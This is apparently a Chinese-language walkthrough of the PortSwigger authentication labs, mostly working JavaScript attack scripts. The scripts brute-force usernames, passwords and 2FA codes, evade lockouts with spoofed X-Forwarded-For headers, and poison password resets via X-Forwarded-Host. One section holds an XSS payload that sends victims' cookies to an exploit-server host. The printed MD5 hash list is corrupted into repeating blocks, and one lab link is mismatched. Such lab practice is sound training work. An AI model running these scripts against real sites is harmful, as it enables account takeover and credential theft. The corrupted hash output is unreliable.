---
title: Authentication vulnerabilities
description: Authentication vulnerabilities
last_update:
  date: "2025-09-16T08:00:00+08:00"
---

## Lab: Username enumeration via different responses

| Dimension | Description                                                                                                         |
| --------- | ------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/password-based#username-enumeration                             |
| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses |

usernames

```js
const usernames = `carlos
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser
academico
acceso
access
accounting
accounts
acid
activestat
ad
adam
adkit
admin
administracion
administrador
administrator
administrators
admins
ads
adserver
adsl
ae
af
affiliate
affiliates
afiliados
ag
agenda
agent
ai
aix
ajax
ak
akamai
al
alabama
alaska
albuquerque
alerts
alpha
alterwind
am
amarillo
americas
an
anaheim
analyzer
announce
announcements
antivirus
ao
ap
apache
apollo
app
app01
app1
apple
application
applications
apps
appserver
aq
ar
archie
arcsight
argentina
arizona
arkansas
arlington
as
as400
asia
asterix
at
athena
atlanta
atlas
att
au
auction
austin
auth
auto
autodiscover`.split("\n");
```

passwords

```js
const passwords = `123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow`.split("\n");
```

login function

```js
function login(username, password) {
  return fetch(`${location.origin}/login`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
    method: "POST",
    credentials: "include",
  });
}
```

main function

```js
async function main() {
  for (const username of usernames) {
    for (const password of passwords) {
      const response = await login(username, password);
      // custom logic here
      const isCorrect = response.redirected;
      if (isCorrect) return;
      const text = await response.text();
      const isInvalidUsername = text.includes("Invalid username");
      if (isInvalidUsername) break;
    }
  }
}
```

## Lab: Username enumeration via subtly different responses

| Dimension | Description                                                                                                                |
| --------- | -------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/password-based#username-enumeration                                    |
| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses |

先找出正確的 username

```js
async function main() {
  for (const username of usernames) {
    for (const password of passwords.slice(0, 1)) {
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const isInvalid = text.includes("Invalid username or password.");
      if (!isInvalid) {
        console.log(username);
        return;
      }
    }
  }
}
```

得出 `antivirus` 之後，開始爆破密碼

```js
async function main() {
  for (const username of ["antivirus"]) {
    for (const password of passwords) {
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const isInvalid = text.includes("Invalid username or password ");
      if (!isInvalid) {
        console.log(username, password);
        return;
      }
    }
  }
}
```

這題的重點觀念是，"帳號錯誤" 跟 "密碼錯誤" 可能會回傳些許不同的 error message，利用這個差異，就可以得知這個帳號是合法的

- 帳號錯誤 => `"Invalid username or password."`
- 密碼錯誤 => `"Invalid username or password "`

## Lab: Username enumeration via response timing

| Dimension | Description                                                                             |
| --------- | --------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/password-based#username-enumeration |
| Lab       | https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected              |

先找出正確的 username

login function，加上 `X-Forwarded-For` 避免同一個 IP 被鎖

```js
function login(username, password) {
  return fetch(`${location.origin}/login`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
      "X-Forwarded-For": new Date().toISOString(),
    },
    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
    method: "POST",
    credentials: "include",
  });
}
```

main function

```js
async function main() {
  for (const username of usernames) {
    for (const password of [
      "123123123123123123123213123123123123123123123123123123123123123123123123123123123123123123",
    ]) {
      const start = performance.now();
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const end = performance.now();
      const ms = end - start;
      const isBlocked = text.includes(
        "You have made too many incorrect login attempts. Please try again in 30 minute(s).",
      );
      const isValid = response.redirected;
      if (isValid) {
        console.log(username, password);
        return;
      }
      if (isBlocked) return;
      if (ms > 400) console.log(username, password);
    }
  }
}
```

結果有多個 `['carlos', 'ak']`，畢竟透過時間來判斷不是很準確

```js
async function main() {
  for (const username of ["carlos", "ak"]) {
    for (const password of passwords) {
      const start = performance.now();
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const end = performance.now();
      const ms = end - start;
      const isBlocked = text.includes(
        "You have made too many incorrect login attempts. Please try again in 30 minute(s).",
      );
      const isValid = response.redirected;
      if (isValid) {
        console.log(username, password);
        return;
      }
      if (isBlocked) return;
      if (ms > 400) console.log(username, password);
    }
  }
}
```

這題的重點是，在爆破 username 的時候，記得 password 用長一點的，才可以把時間差異擴大

## Lab: Broken brute-force protection, IP block

| Dimension | Description                                                                                                  |
| --------- | ------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/authentication/password-based#flawed-brute-force-protection             |
| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block |

```js
function loginWiener() {
  fetch(`${location.origin}/login`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: "username=wiener&password=peter",
    method: "POST",
    credentials: "include",
  });
}

async function main() {
  for (const password of passwords) {
    const response = await login("carlos", password);
    // custom logic here
    const isCorrect = response.redirected;
    if (isCorrect) return console.log(password);
    await loginWiener();
  }
}
```

## Lab: Username enumeration via account lock

| Dimension | Description                                                                                                  |
| --------- | ------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/authentication/password-based#account-locking                           |
| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock |

測試同一個 valid 帳號連續錯誤 5 次就會鎖

```js
async function main() {
  for (const username of usernames) {
    for (const password of passwords.slice(0, 1)) {
      await login(username, password);
      await login(username, password);
      await login(username, password);
      await login(username, password);
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const isInvalid = text.includes("Invalid username or password.");
      console.log({ username, password, isInvalid });
      if (!isInvalid) {
        console.log(username, "isValid");
        return;
      }
    }
  }
}
```

來猜密碼

```js
async function main() {
  for (const username of ["agenda"]) {
    for (const password of passwords) {
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const isInvalid = text.includes("Invalid username or password.");
      console.log({ username, password, isInvalid });
      if (!isInvalid) {
        console.log(username, "isValid");
        return;
      }
    }
  }
}
```

第 4 次的時候停下來了，錯誤訊息是

```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```

嘗試加個 sleep，每嘗試 3 次就休息 1 分鐘，雙螢幕的夥伴就可以先把 youtube 打開刷影片了(x)

```js
function sleep(time) {
  return new Promise((resolve) => {
    setTimeout(resolve, time);
  });
}

async function main() {
  let count = 0;
  for (const username of ["agenda"]) {
    for (const password of passwords.slice(3)) {
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const isInvalid = text.includes("Invalid username or password.");
      count += 1;
      console.log({ username, password, isInvalid });
      if (!isInvalid) {
        console.log(username, "stops");
        return;
      }
      if (count === 3) {
        count = 0;
        await sleep(60000);
      }
    }
  }
}
```

過了約 30 分鐘，終於在第 95 次嘗試的時候找到答案，感動～

## Lab: Broken brute-force protection, multiple credentials per request

| Dimension | Description                                                                                                                           |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/password-based#user-rate-limiting                                                 |
| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request |

嘗試第 4 次的時候，看到

```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```

題目說 multiple credentials per request，所幸死馬當活馬醫，直接把所有 passwords 塞進去一個 HTTP Request

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    username: "carlos",
    password: passwords,
  }),
  method: "POST",
  credentials: "include",
});
```

結果就神奇的通關了，是說真的會有後端這樣設計登入流程嗎...

## Lab: 2FA simple bypass

| Dimension | Description                                                                                          |
| --------- | ---------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/multi-factor#bypassing-two-factor-authentication |
| Lab       | https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass               |

先用 `carlos:montoya` 登入

之後直接進入 `/my-account?id=carlos` 就成功 Bypass

## Lab: 2FA broken logic

| Dimension | Description                                                                                           |
| --------- | ----------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/multi-factor#flawed-two-factor-verification-logic |
| Lab       | https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic                 |

在 `/login2` 可以發現 `Cookie: verify=wiener`，嘗試將 `wiener` 改成 `carlos`，並且重整頁面，確保有重新發送 4-digit security code

之後就可以開始暴力破解

```js
const codes = Array(10000)
  .fill(0)
  .map((zero, idx) => String(idx).padStart(4, "0"));

function login(code) {
  return fetch(`${location.origin}/login2`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `mfa-code=${code}`,
    method: "POST",
    credentials: "include",
  });
}

async function main() {
  for (const code of codes) {
    const response = await login(code);
    if (response.redirected) return;
  }
}
```

成功在 1630 停下

## Lab: 2FA bypass using a brute-force attack

| Dimension | Description                                                                                                |
| --------- | ---------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/multi-factor#brute-forcing-2fa-verification-codes      |
| Lab       | https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack |

這題有點麻煩，有 csrf token + 驗證碼輸入錯誤 2 次就要重新登入

```js
const codes = Array(10000)
  .fill(0)
  .map((zero, idx) => String(idx).padStart(4, "0"));
function login(csrf) {
  return fetch(`${location.origin}/login`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `csrf=${csrf}&username=carlos&password=montoya`,
    method: "POST",
    credentials: "include",
  });
}
function login2(code, csrf) {
  return fetch(`${location.origin}/login2`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `mfa-code=${code}&csrf=${csrf}`,
    method: "POST",
    credentials: "include",
  });
}
function getRandomNumber() {
  return Math.floor(Math.random() * 10000);
}
async function main() {
  let csrf = document.querySelector("[name='csrf']").value;
  let round = 0;
  while (true) {
    round += 1;
    const response1 = await login(csrf);
    const html1 = await response1.text();
    csrf = html1
      .split(`<input required type="hidden" name="csrf" value="`)[1]
      .split(`">`)[0];

    for (let i = 0; i <= 1; i++) {
      const idx = getRandomNumber();
      const code = codes[idx];
      const response2 = await login2(code, csrf);
      if (response2.redirected) return;
      const html2 = await response2.text();
      csrf = html2
        .split(`<input required type="hidden" name="csrf" value="`)[1]
        .split(`">`)[0];
    }
    console.log({ round });
  }
}
```

算起來每一輪的成功率只有 2 / 10000 = 0.02%，期望值是 5000 輪會猜到，最後我成功在 1273 輪猜到答案

## Lab: Brute-forcing a stay-logged-in cookie

| Dimension | Description                                                                                                    |
| --------- | -------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/other-mechanisms#keeping-users-logged-in                   |
| Lab       | https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie |

登入後，可以看到 `Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC`

```js
atob(`d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`); // wiener:51dc30ddc473d43a6011e9ebba6ca770
// 51dc30ddc473d43a6011e9ebba6ca770 剛好就是 peter 的 MD5 Hash Result
```

由於瀏覽器的 JS 沒有原生的 MD5 Hash Function 可以用，所以我們用 NodeJS 來生成

```js
const crypto = require("crypto");
const hashedPasswords = passwords.map((password) =>
  crypto.createHash("md5").update(password).digest("hex"),
);
console.log(hashedPasswords);
```

結果

```js
[
  "e10adc3949ba59abbe56e057f20f883e",
  "5f4dcc3b5aa765d61d8327deb882cf99",
  "25d55ad283aa400af464c76d713c07ad",
  "d8578edf8458ce06fbc5bb76a58c5ca4",
  "25f9e794323b453885f5181f1b624d0b",
  "827ccb0eea8a706c4c34a16891f84e7b",
  "81dc9bdb52d04dc20036dbd8313ed055",
  "96e79218965eb72c92a549dd5a330112",
  "fcea920f7412b5da7be0cf42b8c93759",
  "8621ffdbc5698829397d97767ac13db3",
  "4297f44b13955235245b2497399d7a93",
  "276f8db0b86edaa7fc805516c852c889",
  "e99a18c428cb38d5f260853678922e03",
  "37b4e2d82900d5e94b8da524fbeb33c0",
  "d0763edaa9d9bd2a9516280e9044d885",
  "0d107d09f5bbe40cade3de5c71e9e9b7",
  "3bf1114a986ba87ed28fc1b5884fc2f8",
  "eb0a191797624dd3a48fa681d3061212",
  "f379eaf3c831b04de153469d1bec345e",
  "6eea9b7ef19179a06954edd0f6c05ceb",
  "c8837b23ff8aaa8a2dde915473ce0991",
  "bee783ee2974595487357e195ef38ca2",
  "e807f1fcf82d132f9bb018ca6738a19f",
  "0acf4539a14b3aa27deeb4cbdf6e989f",
  "c33367701511b4f6020ec61ded352059",
  "84d961568a65073a3bcf0eb216b2a576",
  "1c63129ae9db9c60c3e8aa94d3e00495",
  "dc0fa7df3d07904a09288bd2d2bb5f40",
  "93279e3308bdbbeed946fc965017f67a",
  "670b14728ad9902aecba32e22fa4f6bd",
  "76419c58730d9f35de7ac538c2fd6737",
  "46f94c8de14fb36680850768ff1b7f2a",
  "b36d331451a61eb2d76860e00c347396",
  "5fcfd41e547a12215b173ff47fdd3739",
  "d16d377af76c99d27093abc22244b342",
  "1660fe5c81c4ce64a2611494c439e1ba",
  "02c75fb22c75b23dc963c7eb91a062cc",
  "a152e841783914146e4bcd4f39100686",
  "6b1b36cbb04b41490bfc0ab2bfa26f86",
  "d9b23ebbf9b431d009a20df52e515db5",
  "da443a0ad979d5530df38ca1a74e4f80",
  "ef4cdd3117793b9fd593d7488409626d",
  "ec0e2603172c73a8b644bb9456c1ff6e",
  "d914e3ecf6cc481114a3f534a5faf90b",
  "f78f2477e949bee2d12a2c540fb6084f",
  "0571749e2ac330a7455809c6b0e7af90",
  "f25a2fc72690b780b2a14e140ef6a9e0",
  "08f90c1a417155361a5c4b8d297e0d78",
  "bf779e0933a882808585d19455cd7937",
  "684c851af59965b680086b7b4896ff98",
  "ef6e65efc188e7dffd7335b646a85a21",
  "df0349ce110b69f03b4def8012ae4970",
  "ad92694923612da0600d7be498cc2e08",
  "aa47f8215c6f30a0dcdb2a36a9f4168e",
  "5badcaf789d3d1d09794d8f021f40f0e",
  "ee89f7a7a0565ba56f8fb5794c0bd9fe",
  "d0970714757783e6cf17b26fb8e2298f",
  "9b306ab04ef5e25f9fb89c998a6aedab",
  "df53ca268240ca76670c8566ee54568a",
  "2345f10bb948c5665ef91f6773b3e455",
  "aae039d6aa239cfc121357a825210fa3",
  "b3f952d5d9adea6f63bee9d4c6fceeaa",
  "b59c67bf196a4758191e42f76670ceba",
  "b427ebd39c845eb5417b7f7aaf1f9724",
  "5b1b68a9abf4d2cd155c81a9225fd158",
  "1bbd886460827015e5d605ed44252251",
  "e04755387e5b5968ec213e41f70c1d46",
  "d5aa1729c8c253e5d917a5264855eab8",
  "f63f4fbc9f8c85d409f2f59f2b9e12d5",
  "1a1dc91c907325c69271ddf0c944bc72",
  "1d3d37667a8d7eb02054c6afdf9e2e1c",
  "5583413443164b56500def9a533c7c70",
  "0b4e7a0e5fe84ad35fb5f95b9ceeac79",
  "6f4ec514eee84cc58c8e610a0c87d7a2",
  "8afa847f50a716e64932d995c8e7435a",
  "d1133275ee2118be63a577af759fc052",
  "fea0f1f6fede90bd0a925b4194deac11",
  "6209804952225ab3d14348307b5a4a27",
  "6b1628b016dff46e6fa35684be6acc96",
  "b5c0b187fe309af0f4d35982fd961d7e",
  "adff44c5102fca279fce7559abf66fee",
  "fc63f87c08d505264caba37514cd0cfd",
  "91cb315a6405bfcc30e2c4571ccfb8ce",
  "5ef64bad8f9d7e0c85f821580e4d6629",
  "e6a5ba0842a531163425d66839569a68",
  "9df3b01c60df20d13843841ff0d4482c",
  "1d10ca7f8fe2615bf72a249a7d34d6b9",
  "6ebe76c9fb411be97b3b0d48b791a7c9",
  "09f8316e29649a7f795f414ba3860fc0",
  "229979fce5174c17d4645bf8752dae1e",
  "5c7686c0284e0875b26de99c1008e998",
  "7d8bc5f1a8d3787d06ef11c97d4655df",
  "21b72c0b7adc5c7b4a50ffcb90d92dd6",
  "b3e8cdd9ff44259fd67e879e578cd8f4",
  "bd1d7b0809e4b4ee9ca307aa5308ea6f",
  "1d10ca7f8fe2615bf72a249a7d34d6b9",
  "6ebe76c9fb411be97b3b0d48b791a7c9",
  "09f8316e29649a7f795f414ba3860fc0",
  "229979fce5174c17d4645bf8752dae1e",
  "5c7686c0284e0875b26de99c1008e998",
  "7d8bc5f1a8d3787d06ef11c97d4655df",
  "21b72c0b7adc5c7b4a50ffcb90d92dd6",
  "b3e8cdd9ff44259fd67e879e578cd8f4",
  "bd1d7b0809e4b4ee9ca307aa5308ea6f",
  "6ebe76c9fb411be97b3b0d48b791a7c9",
  "09f8316e29649a7f795f414ba3860fc0",
  "229979fce5174c17d4645bf8752dae1e",
  "5c7686c0284e0875b26de99c1008e998",
  "7d8bc5f1a8d3787d06ef11c97d4655df",
  "21b72c0b7adc5c7b4a50ffcb90d92dd6",
  "b3e8cdd9ff44259fd67e879e578cd8f4",
  "bd1d7b0809e4b4ee9ca307aa5308ea6f",
  "09f8316e29649a7f795f414ba3860fc0",
  "229979fce5174c17d4645bf8752dae1e",
  "5c7686c0284e0875b26de99c1008e998",
  "7d8bc5f1a8d3787d06ef11c97d4655df",
  "21b72c0b7adc5c7b4a50ffcb90d92dd6",
  "b3e8cdd9ff44259fd67e879e578cd8f4",
  "bd1d7b0809e4b4ee9ca307aa5308ea6f",
  "21b72c0b7adc5c7b4a50ffcb90d92dd6",
  "b3e8cdd9ff44259fd67e879e578cd8f4",
  "bd1d7b0809e4b4ee9ca307aa5308ea6f",
  "08b5411f848a2581a41672a759c87380",
  "b3e8cdd9ff44259fd67e879e578cd8f4",
  "bd1d7b0809e4b4ee9ca307aa5308ea6f",
  "08b5411f848a2581a41672a759c87380",
  "89948c7f4890af5ff18524b4fc3f3611",
  "bd1d7b0809e4b4ee9ca307aa5308ea6f",
  "08b5411f848a2581a41672a759c87380",
  "89948c7f4890af5ff18524b4fc3f3611",
  "6579a92e7f5ac7c57055196b3afe3ddd",
  "6d4db5ff0c117864a02827bad3c361b9",
  "08b5411f848a2581a41672a759c87380",
  "89948c7f4890af5ff18524b4fc3f3611",
  "6579a92e7f5ac7c57055196b3afe3ddd",
  "6d4db5ff0c117864a02827bad3c361b9",
  "89948c7f4890af5ff18524b4fc3f3611",
  "6579a92e7f5ac7c57055196b3afe3ddd",
  "6d4db5ff0c117864a02827bad3c361b9",
  "63b04a371849694ef3864687adcb410a",
  "6579a92e7f5ac7c57055196b3afe3ddd",
  "6d4db5ff0c117864a02827bad3c361b9",
  "63b04a371849694ef3864687adcb410a",
  "63b04a371849694ef3864687adcb410a",
];
```

由於這個 stay-logged-in cookie 不是 HTTP-Only，所以我們可以透過瀏覽器的 JS 來修改

```js
function myAccount(pass) {
  document.cookie = `stay-logged-in=${btoa(`carlos:${pass}`)}`;
  return fetch(`${location.origin}/my-account?id=carlos`);
}

async function main() {
  for (const pass of hashedPasswords) {
    await myAccount(pass);
  }
}
```

## Lab: Offline password cracking

| Dimension | Description                                                                                        |
| --------- | -------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/other-mechanisms#keeping-users-logged-in       |
| Lab       | https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking |

留言功能有 XSS，可以竊取受害者的 cookie，嘗試留言

```html
<script>
  fetch(
    `https://exploit-0add00e9044ebd4f8145d3550182001f.exploit-server.net/exploit?cookie=${encodeURIComponent(document.cookie)}`,
  );
</script>
```

之後在 exploit-server 查看到

```
/exploit?cookie=secret%3D1REpZLmoJqZHg7MI35KYdxNTUijeqvfv%3B%20stay-logged-in%3DY2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

url decode 之後

```js
decodeURIComponent(
  `secret%3D1REpZLmoJqZHg7MI35KYdxNTUijeqvfv%3B%20stay-logged-in%3DY2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`,
);
// secret=1REpZLmoJqZHg7MI35KYdxNTUijeqvfv; stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

base64 decode 之後

```js
atob(`Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`);
// carlos:26323c16d5f4dabff3bb136f2460a943
```

[MD5 reverse](https://md5.gromweb.com/?md5=26323c16d5f4dabff3bb136f2460a943) 之後

```
carlos:onceuponatime
```

成功登入 && 刪除帳號～

常見的 MD5 hashed 弱密碼可以透過 [線上的 MD5 Reverse 工具](https://md5.gromweb.com/) 來得知，我也是最近才得知的，因為 MySQL 跟 FileZilla Server 都會存 MD5 Hashed 密碼

## Lab: Password reset broken logic

| Dimension | Description                                                                                          |
| --------- | ---------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/other-mechanisms#resetting-passwords-using-a-url |
| Lab       | https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic |

在 `/forget-password` 頁面的表單看到

```html
<input required="" type="hidden" name="username" value="wiener" />
```

改成 `carlos` 就可以成功修改受害者的密碼～

## Lab: Password reset poisoning via middleware

| Dimension | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/other-mechanisms#resetting-passwords-using-a-url             |
| Lab       | https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware |

這題我怎覺得是 Expert 等級，主要是我沒想到要用 `X-Forwarded-Host`

```js
fetch(`${location.origin}/forgot-password`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
    "X-Forwarded-Host":
      "exploit-0ae9008f0486b173822c0a6d014a008f.exploit-server.net",
  },
  body: "username=carlos",
  method: "POST",
  credentials: "include",
});
```

之後看 log

```
/forgot-password?temp-forgot-password-token=0n2m78it8uxcstar2p6y9tm9kzbee7z2
```

用受害者的 token 就可以成功修改密碼

## X-Forwarded-Host

補充一下 `X-Forwarded-Host`，是用來存放最終的 `Host`，因為中間層會去修改 `Host` 的值

## Lab: Password brute-force via password change

| Dimension | Description                                                                                                       |
| --------- | ----------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/other-mechanisms#changing-user-passwords                      |
| Lab       | https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change |

登入自己帳號的情況，枚舉受害者的密碼，若 `current-password` 正確且 `new-password` 不匹配，就會回傳 `New passwords do not match`

```js
function changePassword(currentPassword) {
  return fetch(`${location.origin}/my-account/change-password`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `username=carlos&current-password=${currentPassword}&new-password-1=123&new-password-2=456`,
    method: "POST",
    credentials: "include",
  });
}

async function main() {
  for (const password of passwords) {
    const response = await changePassword(password);
    const text = await response.text();
    if (text.includes("New passwords do not match"))
      return console.log(password);
  }
}
```

成功得出 `carlos:12345`，之後成功修改帳密～

## 小結

雖然這系列有介紹蠻多方法，但感覺很多時候都還是要 brute-force 帳號 or 密碼，除非剛好是弱帳密組合，不然實務上真的很難猜到

## 參考資料

- https://portswigger.net/web-security/authentication
